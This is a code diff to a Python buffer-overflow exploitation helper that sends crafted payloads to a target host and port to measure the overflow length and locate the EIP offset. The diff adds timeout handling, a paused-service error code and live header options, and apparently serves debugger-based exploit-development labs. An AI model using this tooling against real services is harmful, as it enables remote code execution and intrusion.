@@ -11,9 +11,10 @@ BOFErrorFailure = -1
 BOFErrorConnectionRefused = -2
 BOFErrorConnectionTimeout = -3
 BOFErrorServiceAlive = -4
-BOFErrorValueNotFound = -5
-BOFErrorNoSpace = -6
-BOFErrorInvalid = -7
+BOFErrorServicePaused = -5
+BOFErrorValueNotFound = -6
+BOFErrorNoSpace = -7
+BOFErrorInvalid = -8
 
 # Live prefix/suffix options
 BOFLiveOptions = ["payload_len"]
@@ -21,10 +22,6 @@ BOFLiveOptions = ["payload_len"]
 
 def live_option_long(option: str) -> bytes:
     return ("BOFLive." + option).encode()
-
-
-def live_option_short(option: bytes) -> str:
-    return option.replace(b"BOFLive.", b"").decode()
 
 
 def execute(cmd: str) -> bytes:
@@ -43,7 +40,7 @@ class BOFHelper:  # FIX: Error checking inputs, binascii.unhexlify, commands, li
         self._port = port
         self._header = header
         self._origHeader = header
-        self._liveOptions = []
+        self._liveOptions = {}
         self._prefix = prefix
         self._suffix = suffix
         self._inc = inc  # The step of increment in getNumBytesToOverflow().
@@ -53,7 +50,7 @@ class BOFHelper:  # FIX: Error checking inputs, binascii.unhexlify, commands, li
         for option in BOFLiveOptions:
             full_option = live_option_long(option)
             if full_option in self._header:
-                self._liveOptions.append(full_option)
+                self._liveOptions[full_option] = b""
 
         self._numBytesObtained = False
         self._eipOffset = 0
@@ -102,12 +99,12 @@ class BOFHelper:  # FIX: Error checking inputs, binascii.unhexlify, commands, li
         self._log("(!!!) " + text, debug)
 
     def prompt_restart(self):
-        self.prompt_log("Please restart the vulnerable application and your debugger. Press enter to continue...")
+        self.prompt_log("Please restart the vulnerable application and your debugger. Type anything to continue...")
         input()
 
-    def _process_header(self, values: dict[str]) -> None:
+    def _process_header(self) -> None:
         for option in self._liveOptions:
-            self._header = self._origHeader.replace(option, values[live_option_short(option)].encode())
+            self._header = self._origHeader.replace(option, self._liveOptions[option])
 
     # @function send_data
     # @abstract Helper function sending data to designated port on the target.
@@ -119,14 +116,16 @@ class BOFHelper:  # FIX: Error checking inputs, binascii.unhexlify, commands, li
     # @param trial  Records the number of time this request has been resent. Set to 5 to disable
     #               resending in case of socket timeout.
 
-    def send_data(self, buffer: bytes, trial: int = 0) -> int:
+    def send_data(self, buffer: bytes, trial: int = 5) -> int:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.settimeout(self._timeout)
         try:
             s.connect((self._ip, self._port))
             if buffer:
-                # think of a good way to handle this
-                self._process_header({"payload_len": str(len(buffer) + len(self._prefix) + len(self._suffix))})
+                option = live_option_long("payload_len")
+                if option in self._liveOptions:
+                    self._liveOptions[option] = str(len(buffer) + len(self._prefix) + len(self._suffix)).encode()
+                self._process_header()
                 s.send(self._header + self._prefix + buffer + self._suffix)
         except ConnectionRefusedError:
             self.err_log("Could not connect to %s at port %s!" % (self._ip, self._port))
@@ -140,6 +139,9 @@ class BOFHelper:  # FIX: Error checking inputs, binascii.unhexlify, commands, li
             self.debug_log(res)
         except ConnectionResetError:
             return BOFErrorConnectionTimeout
+        except socket.timeout:
+            self.warn_log("Remember to start the service!")
+            return BOFErrorServicePaused
 
         s.close()
         time.sleep(1)
@@ -200,6 +202,10 @@ class BOFHelper:  # FIX: Error checking inputs, binascii.unhexlify, commands, li
             self.err_log("Service did not crash!")
             return BOFErrorServiceAlive
 
+        # Wait for user to resume the service & resend
+        elif error == BOFErrorServicePaused:
+            return self._send_unique_pattern(length)
+
         # Connection refused. Bye!
         elif error == BOFErrorConnectionRefused:
             return BOFErrorConnectionRefused
@@ -248,6 +254,7 @@ class BOFHelper:  # FIX: Error checking inputs, binascii.unhexlify, commands, li
             self.func_log("Locating EIP...")
 
         mid = low + (high - low) // 2  # Safe way to get mid
+        print(mid)
         error = self._send_unique_pattern(mid)
 
         # Success!
